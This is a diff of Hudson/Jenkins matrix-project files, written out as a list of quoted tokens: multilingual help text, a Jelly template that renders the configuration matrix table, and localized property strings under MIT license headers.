"@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Values", "assigned", "to", "variables", ".", "Multiple", "values", "are", "separated", "by", "whitespace", "or", "newlines", ".", "Use", "shell", "quoting", "syntax", "for", "a", "value", "that", "contains", "whitespace", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "5", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Geben", "Sie", "hier", "die", "Werte", "an", ",", "welche", "die", "Variable", "annehmen", "kann", ".", "Mehrere", "Werte", "werden", "durch", "Leerraum", "oder", "Zeilenumbr", "\u00fc", "che", "getrennt", ".", "Verwenden", "Sie", "die", "Shell", "-", "Notation", ",", "um", "Werte", "mit", "Leerr", "\u00e4", "umen", "anzugeben", ".", "<", "/", "div", ">", "\ufeff", "<", "div", ">", "Valeurs", "\u00e0", "assigner", "aux", "variables", ".", "Les", "valeurs", "multiples", "sont", "s", "\u00e9", "par", "\u00e9", "es", "par", "des", "espaces", "ou", "des", "retours", "\u00e0", "la", "ligne", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "<", "div", ">", "\u5909", "\u6570\u306b", "\u5272\u308a", "\u5f53\u3066", "\u308b\u5024", "\u3067\u3059", "\u3002\u8907", "\u6570\u306e", "\u5024\u3092", "\u8a2d\u5b9a", "\u3059\u308b", "\u5834\u5408", "\u306f\u3001", "\u30b9\u30da", "\u30fc\u30b9", "\u304b\u6539", "\u884c\u3067", "\u533a\u5207", "\u308a\u307e", "\u3059\u3002", "\u5024", "\u304c\u30b9", "\u30da\u30fc", "\u30b9\u3092", "\u542b\u3080", "\u5834\u5408", "\u306f\u3001", "Shell", "\u3068", "\u540c\u69d8", "\u306b\u5f15", "\u7528\u7b26", "\u3092\u4f7f", "\u7528\u3057", "\u3066\u304f", "\u3060\u3055", "\u3044\u3002", "<", "/", "div", ">", "<", "div", ">", "Waardenreeks", "voor", "uw", "dimensie", ".", "Waarden", "dienen", "gescheiden", "te", "worden", "door", "spaties", "of", "een", "nieuwe", "lijn", "character", ".", "<", "/", "div", ">", "<", "div", ">", "Valores", "associados", "a", "vari", "&", "#", "225", ";", "veis", ".", "Valores", "m", "&", "#", "250", ";", "ltiplos", "est", "&", "#", "227", ";", "o", "separados", "por", "espa", "&", "#", "231", ";", "o", "em", "branco", "ou", "nova", "linha", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "<", "div", ">", "\u0417", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u044f", "\u043f", "\u0440\u0438", "\u0441\u0432", "\u0430\u0438", "\u0432\u0430", "\u044e\u0442", "\u0441\u044f", "\u043f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u044b", "\u043c.", "\u041c", "\u043d\u043e", "\u0436\u0435", "\u0441\u0442", "\u0432\u0435", "\u043d\u043d", "\u044b\u0435", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u044f", "\u0440", "\u0430\u0437", "\u0434\u0435", "\u043b\u044f", "\u044e\u0442", "\u0441\u044f", "\u043f", "\u0440\u043e", "\u0431\u0435", "\u043b\u0430", "\u043c\u0438", "\u0438", "\u043b\u0438", "\u043f", "\u0435\u0440", "\u0435\u0432", "\u043e\u0434", "\u0430\u043c", "\u0438", "\u0441", "\u0442\u0440", "\u043e\u043a", ".", "<", "/", "div", ">", "<", "div", ">", "De", "&", "#", "287", ";", "erler", ",", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "kenlere", "atan", "&", "#", "305", ";", "r", ".", "Birden", "fazla", "de", "&", "#", "287", ";", "er", "bo", "&", "#", "351", ";", "luk", "karakteri", "veya", "yeni", "sat", "&", "#", "305", ";", "r", "se", "&", "#", "231", ";", "ene", "&", "#", "287", ";", "i", "ile", "ayr", "&", "#", "305", ";", "lmal", "&", "#", "305", ";", "d", "&", "#", "305", ";", "r", ".", "<", "/", "div", ">", "<", "div", ">", "\u6307", "\u5b9a\u7d66", "\u8b8a\u6578", "\u7684\u503c", "\u3002\u4e0d", "\u540c\u503c", "\u4e4b\u9593", "\u8acb\u7528", "\u7a7a\u767d", "\u6216\u662f", "\u63db\u884c", "\u4f86\u9694", "\u958b\u3002", "\u5982", "\u679c\u503c", "\u7576\u4e2d", "\u6709\u7a7a", "\u767d\u5b57", "\u5143\uff0c", "\u8acb\u4f7f", "\u7528", "Shell", "\u7684", "\u5f15\u865f", "\u8a9e\u6cd5", "\u4f86\u8655", "\u7406\u3002", "<", "/", "div", ">", "@", "@", "-", "28", ",", "7", "+", "28", ",", "7", "@", "@", "THE", "SOFTWARE", ".", "<", "j", ":", "if", "test", "=", "\"$", "{(", "it", ".", "name", "!", "=", "it", ".", "displayName", ")", "and", "(", "it", ".", "class", ".", "name", "!", "='", "hudson", ".", "matrix", ".", "MatrixConfiguration", "'", ")}", "\">", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Yahoo", "!", "Inc", ".", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!", "Generate", "configuration", "matrix", "and", "invoke", "body", "with", "'", "p", "'", "as", "the", "instance", "of", "T", "(", "of", "Layouter", "<", "T", ">", ")", "Used", "by", "Matrix", "*", "classes", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "st", ":", "documentation", ">", "Generate", "configuration", "matrix", "and", "invoke", "body", "with", "'", "p", "'", "as", "the", "instance", "of", "T", "(", "of", "Layouter", "&", "lt", ";", "T", ">", ")", "<", "st", ":", "attribute", "name", "=", "\"", "autoRefresh", "\"", ">", "If", "specified", ",", "the", "content", "of", "the", "matrix", "will", "be", "automatically", "updated", "via", "AJAX", ".", "(", "This", "happens", "by", "requesting", "URL", "\"", "./", "ajaxMatrix", "\"", ",", "so", "the", "caller", "needs", "\"", "ajaxMatrix", ".", "jelly", "\"", "to", "serve", "this", "request", ".", ")", "<", "/", "st", ":", "attribute", ">", "<", "/", "st", ":", "documentation", ">", "<", "j", ":", "set", "var", "=", "\"", "o", "\"", "value", "=", "\"$", "{", "it", ".", "layouter", "}", "\"/", ">", "<", "div", "id", "=", "'", "matrix", "'", ">", "<", "j", ":", "choose", ">", "<", "!-", "-", "Optimized", "case", "when", "there", "'", "s", "only", "one", "dimension", "to", "the", "axis", "(", "or", "zero", "dimension", ")", "-", "->", "<", "j", ":", "when", "test", "=", "\"$", "{", "empty", "(", "o", ".", "x", ")", "and", "empty", "(", "o", ".", "y", ")", "}\"", ">", "<", "h2", ">", "${", "%", "Configurations", "}", "</", "h2", ">", "<", "j", ":", "forEach", "var", "=", "\"", "p", "\"", "items", "=", "\"$", "{", "o", ".", "rows", "[", "0", "]", "[", "0", "]", "}\"", ">", "<", "d", ":", "invokeBody", "/", ">", "<", "st", ":", "nbsp", "/", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "j", ":", "when", ">", "<", "j", ":", "otherwise", ">", "<", "table", "id", "=", "\"", "configuration", "-", "matrix", "\"", ">", "<", "!-", "-", "X", "-", "axis", "-", "->", "<", "j", ":", "forEach", "var", "=", "\"", "x", "\"", "items", "=", "\"$", "{", "o", ".", "x", "}", "\"", "varStatus", "=", "\"", "loop", "\"", ">", "<", "tr", "class", "=", "\"", "matrix", "-", "row", "\"", ">", "<", "!-", "-", "space", "for", "Y", "-", "axis", "-", "->", "<", "j", ":", "if", "test", "=", "\"$", "{!", "empty", "(", "o", ".", "y", ")", "}\"", ">", "<", "td", "id", "=", "\"", "matrix", "-", "title", "\"", "colspan", "=", "\"$", "{", "size", "(", "o", ".", "y", ")", "}\"", ">$", "{%", "Configuration", "Matrix", "}", "</", "td", ">", "<", "/", "j", ":", "if", ">", "<", "j", ":", "forEach", "begin", "=", "\"", "1", "\"", "end", "=", "\"$", "{", "o", ".", "repeatX", "(", "loop", ".", "index", ")", "}\"", ">", "<", "j", ":", "forEach", "var", "=", "\"", "v", "\"", "items", "=", "\"$", "{", "x", ".", "values", "}", "\">", "<", "td", "class", "=", "\"", "matrix", "-", "header", "\"", "colspan", "=", "\"$", "{", "o", ".", "width", "(", "loop", ".", "index", ")", "}\"", ">$", "{", "v", "}", "</", "td", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "tr", ">", "<", "/", "j", ":", "forEach", ">", "<", "!-", "-", "Y", "-", "axis", "-", "->", "<", "j", ":", "forEach", "var", "=", "\"", "r", "\"", "items", "=", "\"$", "{", "o", ".", "rows", "}", "\">", "<", "tr", ">", "<", "j", ":", "forEach", "var", "=", "\"", "y", "\"", "items", "=", "\"$", "{", "o", ".", "y", "}", "\"", "varStatus", "=", "\"", "loop", "\"", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "r", ".", "drawYHeader", "(", "loop", ".", "index", ")", "!=", "null", "}", "\">", "<", "td", "class", "=", "\"", "matrix", "-", "leftcolumn", "\"", "rowspan", "=", "\"$", "{", "o", ".", "height", "(", "loop", ".", "index", ")", "}\"", ">$", "{", "r", ".", "drawYHeader", "(", "loop", ".", "index", ")", "}<", "/", "td", ">", "<", "/", "j", ":", "if", ">", "<", "/", "j", ":", "forEach", ">", "<", "j", ":", "forEach", "var", "=", "\"", "c", "\"", "items", "=", "\"$", "{", "r", "}", "\">", "<", "td", "class", "=", "\"", "matrix", "-", "cell", "\"", ">", "<", "j", ":", "choose", ">", "<", "j", ":", "forEach", "var", "=", "\"", "p", "\"", "items", "=", "\"$", "{", "c", "}", "\">", "<", "div", ">", "<", "d", ":", "invokeBody", "/", ">", "<", "/", "div", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "j", ":", "choose", ">", "<", "/", "td", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "tr", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "table", ">", "<", "/", "j", ":", "otherwise", ">", "<", "/", "j", ":", "choose", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "ajax", "=", "=", "null", "and", "attrs", ".", "autoRefresh", "and", "!", "h", ".", "isAutoRefresh", "(", "request", ")", "}\"", ">", "<", "script", "defer", "=", "\"", "defer", "\"", ">", "refreshPart", "(", "'", "matrix", "'", ",\"", "./", "ajaxMatrix", "\"", ");", "<", "/", "script", ">", "<", "/", "j", ":", "if", ">", "<", "/", "div", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Configurations", "=", "\\", "u0627", "\\", "u0639", "\\", "u062F", "\\", "u0627", "\\", "u062F", "\\", "u0627", "\\", "u062A", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Konfigurace", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Konfigurationer", "Configuration", "\\", "Matrix", "=", "Konfigurationsmatrice", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Simon", "Wiest", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Konfigurationen", "Configuration", "\\", "Matrix", "=", "Konfigurationsmatrix", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Configuraciones", "Configuration", "\\", "Matrix", "=", "Matriz", "de", "configuraci", "\ufffd", "n", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Konfiguraatiot", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Configurations", "Configuration", "\\", "Matrix", "=", "Matrice", "de", "Configuration", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Configuration", "\\", "Matrix", "=", "\\", "u05DE", "\\", "u05D8", "\\", "u05E8", "\\", "u05D9", "\\", "u05E6", "\\", "u05EA", "\\", "u05D4", "\\", "u05D2", "\\", "u05D3", "\\", "u05E8", "\\", "u05D5", "\\", "u05EA", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Configurazioni", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", 